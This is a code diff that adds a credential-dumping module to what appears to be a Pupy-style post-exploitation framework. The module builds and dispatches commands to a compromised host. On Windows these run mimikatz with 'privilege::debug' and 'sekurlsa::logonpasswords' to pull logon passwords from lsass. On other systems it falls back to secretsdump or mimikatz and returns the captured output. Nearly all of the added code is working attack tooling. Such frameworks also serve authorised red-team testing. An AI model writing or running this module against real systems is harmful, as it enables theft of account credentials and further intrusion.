@@ -2092,3 +2092,48 @@ class InteractiveShellModule(PupyModule):
             "output": result.get("output", ""),
             "error": result.get("error"),
         }
+
+
+class CreddumpModule(PupyModule):
+    """Dump credentials from the target.
+
+    Upstream Pupy's ``creddump`` (via creddump agent module / lsass).
+    Native reimplementation dispatching to available tooling (mimikatz,
+    secretsdump, or a Python-based lsass reader) on the host.
+    """
+
+    name = "creddump"
+    version = "1.0.0"
+    description = "Dump credentials from the target (lsass/mimikatz/secretsdump)"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session, args):
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = (
+                "if exist C:\\Windows\\Temp\\mimikatz.exe "
+                "(C:\\Windows\\Temp\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\") "
+                "else (echo 'mimikatz not available; try secretsdump via impacket')"
+            )
+        else:
+            cmd = (
+                "if command -v secretsdump.py >/dev/null 2>&1; then "
+                "echo 'use secretsdump.py remotely'; "
+                "elif command -v mimikatz >/dev/null 2>&1; then mimikatz; "
+                "else echo 'no credential dumping tool available on host'; fi"
+            )
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
